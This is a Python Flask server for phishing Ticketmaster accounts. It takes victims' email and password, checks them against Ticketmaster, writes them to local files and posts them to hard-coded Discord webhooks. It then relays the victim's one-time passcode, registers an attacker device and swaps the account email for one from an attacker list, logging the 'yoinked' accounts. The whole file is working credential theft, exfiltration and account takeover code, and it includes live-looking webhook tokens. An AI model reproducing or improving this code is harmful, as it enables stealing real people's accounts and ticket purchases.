from flask import Flask, request, jsonify
from flask_cors import CORS

import uuid
import time
import hashlib
import base64
import json
import re
import os
import random
import string
import requests
import ticketmaster_api as tm
import query_db as db

app = Flask(__name__)
CORS(app)

def build_session_from_db(email):
    # Retrieve the latest session data from the database
    session_data = db.get_session(email)

    if session_data:
        # Create a new requests session
        session = requests.Session()

        # Load cookies into the session
        cookies = session_data['cookies']
        for cookie_name, cookie_value in cookies.items():
            session.cookies.set(cookie_name, cookie_value)

        # Load headers into the session
        headers = session_data['headers']
        session.headers.update(headers)

        # Store the OTP link, client token, account age, and pw in variables
        otp_link = session_data['otp_link']
        client_token = session_data['client_token']
        account_age = session_data['account_age']
        pw = session_data['pw']

        print(f"Session for {email} built successfully.")
        print(f"OTP Link: {otp_link}, Client Token: {client_token}, Account Age: {account_age}, PW: {pw}")
        return session, otp_link, client_token, account_age, pw
    else:
        return None, None, None, None, None
    
# Internal method to handle login logic
def login_user(email, password):
    code_verifier = tm.gen_code_verifier()
    login_url = tm.gen_login_url()
    _px2 = tm.gen_px2()
    session, resp = tm.post_login(email, password, _px2, login_url)
    print(resp)
    if "continueLink" in resp or "auth.ticketmaster.com/account" in resp:
        return session, {"status": "success", "message": "Login successful"},login_url, resp
    elif "The user is not found" in resp:
        return None, {"status": "fail", "message": "Invalid email"},login_url, resp
    elif "Credentials mismatch" in resp:
        return None, {"status": "fail", "message": "Invalid password"},login_url, resp
    elif "The account is locked" in resp:
        return None, {"status": "fail", "message": "Account Locked"},login_url, resp
    else:
        return None, {"status": "fail", "message": "Unknown Error"},login_url, resp

def store_session_data(email, session, otp_link=None, client_token=None, account_age=None, pw=None):
    # Parse cookies and headers from the session
    cookies = session.cookies.get_dict()
    headers = dict(session.headers)

    # Call the insert_session function to store the data in the database
    db.insert_session(email, otp_link, client_token, account_age, pw, cookies, headers)

    #OTP STUFF
def send_login_webhook(login):
    url = 'https://discord.com/api/webhooks/1274157576489013258/A6BfrnO0pEMWvTtPPEipEy7J-m2fhe6g9rqIm_P6nxTj4PBO0pgI_W-QUSbLE7w3F15o'
    data = {
        "content": f'New Login Submitted: {login}'
    }

    response = requests.post(url, json=data)

    if response.status_code == 204:
        print("Webhook sent successfully!")
    else:
        print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")

def send_valids_webhook(login):
    url = 'https://discord.com/api/webhooks/1274159657350336573/nYlv3CqFkTnDd4fcRouJhS590pT8_oWjN2cKvdMoBJfu7Y_9a5oZRuwIAYVJchUjE9Sz'
    data = {
        "content": f'New Valid Submitted: {login}'
    }

    response = requests.post(url, json=data)

    if response.status_code == 204:
        print("Webhook sent successfully!")
    else:
        print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")

def send_yoink_webhook(login):
    url = 'https://discord.com/api/webhooks/1274168362259316756/1OWyxFbBVhJoon0L083SW56xLg3DjrreNwl_f36pRcEpkT3cbu88eDIJs_g86nqRfeOc'
    data = {
        "content": f'New Valid Submitted: {login}'
    }

    response = requests.post(url, json=data)

    if response.status_code == 204:
        print("Webhook sent successfully!")
    else:
        print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")


def get_email():
    file_path = 'utils/emails.txt'
    # Open the file in read mode and read all lines
    with open(file_path, 'r') as file:
        lines = file.readlines()

    # Check if the file is not empty
        if lines:
            email = lines[0]
    return email

def remove_email(email):
    try:
        # Open the file in read mode and read all lines
        with open('utils/emails.txt', 'r') as file:
            lines = file.readlines()

        # Remove any trailing newline characters and filter out the email to be removed
        updated_lines = [line.strip() for line in lines if line.strip() != email]

        # Write the updated lines back to the file
        with open('emails.txt', 'w') as file:
            for line in updated_lines:
                file.write(f"{line}\n")
        
        print(f"Email '{email}' has been removed from the file.")
    
    except FileNotFoundError:
        print("The file 'emails.txt' does not exist.")
    except Exception as e:
        print(f"An error occurred: {e}")

@app.route('/login', methods=['POST'])
def login():
    if not request.is_json:
        return jsonify({"status": "fail", "message": "Invalid request, JSON expected"}), 400

    data = request.get_json()

    # Check if email and password are in the JSON payload
    if 'email' not in data or 'password' not in data:
        return jsonify({"status": "fail", "message": "Email and password are required"}), 400

    email = data['email']
    password = data['password']
    
    # Call the internal method to process the login
    session, result, login_url, resp = login_user(email, password)
    print(result)
    if 'fail' in result['status']:
        with open('utils/logins.txt','a',encoding='utf-8', errors='ignore')as logins:
            logins.write(f'{email}:{password}\n')
            send_login_webhook(f'{email}:{password}')
        return jsonify(result), 400
    with open('utils/valids.txt','a',encoding='utf-8', errors='ignore')as logins:
        logins.write(f'{email}:{password}\n')
        send_valids_webhook(f'{email}:{password}')
    code = tm.parse_code(resp)
    device = tm.generate_device_string()
    ex_link = json.loads(resp)['_links']['continueLink']['source']
    print('exchange link ', ex_link)
    session, resp = tm.exchange_link(session, ex_link)
    print(resp)
    session, resp = tm.client_token(session)
    client_token = json.loads(resp)['clientToken']
    session, resp = tm.capture_info(session)
    account_age = json.loads(resp)['accountCreatedDate'].split('-')[0]
    session, resp = tm.get_OTP_link(session, client_token, login_url)
    print(resp)
    if 'verifyDeviceViaPhone' in resp:
        resp = json.loads(resp)
        email_verification_link = resp['_links']['verifyDeviceViaEmail']['source']
        # If verifyDeviceViaPhone is not found, try verifyDeviceViaEmail
    elif 'verifyDeviceViaEmail' in resp:
        resp = json.loads(resp)
        email_verification_link = resp['_links']['verifyDeviceViaEmail']['source']

    session, resp = tm.send_OTP(session, email_verification_link)
    validate_otp = json.loads(resp)['_links']['validateOtp']['source']
    store_session_data(email, session, validate_otp, client_token, account_age, password)
        # Return the result as a JSON response
    if "fail" in result:
        return jsonify(result), 401
    else:
        return jsonify(result), 200
    
@app.route('/otp-validate', methods=['POST'])
def otp_validate():
    print('WE ARE IN THE OTP LAND\n\n')
    if not request.is_json:
        return jsonify({"status": "fail", "message": "Invalid request, JSON expected"}), 400

    data = request.get_json()

    # Check if email and otp_code are in the JSON payload
    if 'email' not in data or 'otp' not in data:
        return jsonify({"status": "fail", "message": "Email and OTP code are required"}), 400

    email = data['email']
    otp_code = data['otp']

    # Call the internal method to validate the OTP
    session, otp_link, client_token, account_age, password = build_session_from_db(email)
    print(client_token)

    session, resp = tm.verify_OTP(session, otp_link, otp_code)
    if "OTP validation failed" in resp:
        #they gave bad otp smh
         return jsonify({"status": "fail", "message": "OTP Incorrect. Please refresh and try again"}), 400
    
    otp_token = json.loads(resp)['verifiedOtpToken']
    session, resp = tm.save_device(session, client_token, otp_token,)
    print(resp)
    verified_device_token = json.loads(resp)['verifiedDeviceToken']
    _email = get_email()
    session, resp = tm.update_email(session, _email.strip(), verified_device_token)

    print(resp)
    if ('OTP validation failed' in resp):
        #wrong OTP code
        return jsonify({"status": "fail", "message": "Invalid OTP. Please try again"}), 400
    elif ('Update is too soon' in resp):
        return jsonify({"status": "success", "message": "Successfully Verified"}), 400
    elif ('newEmail' in resp):
        #congrats they got YOINKED
        send_yoink_webhook(f'{email} | {_email}:{password} | {account_age}')
        with open('utils/changed.txt','a',encoding='utf-8', errors='ignore')as changed:
            changed.write(f'{_email}:{password}:{account_age}\n')
            remove_email(_email)
    # Return the result as a JSON response
    return jsonify(resp), 200
if __name__ == '__main__':
    app.run(debug=True, threaded=True)
    
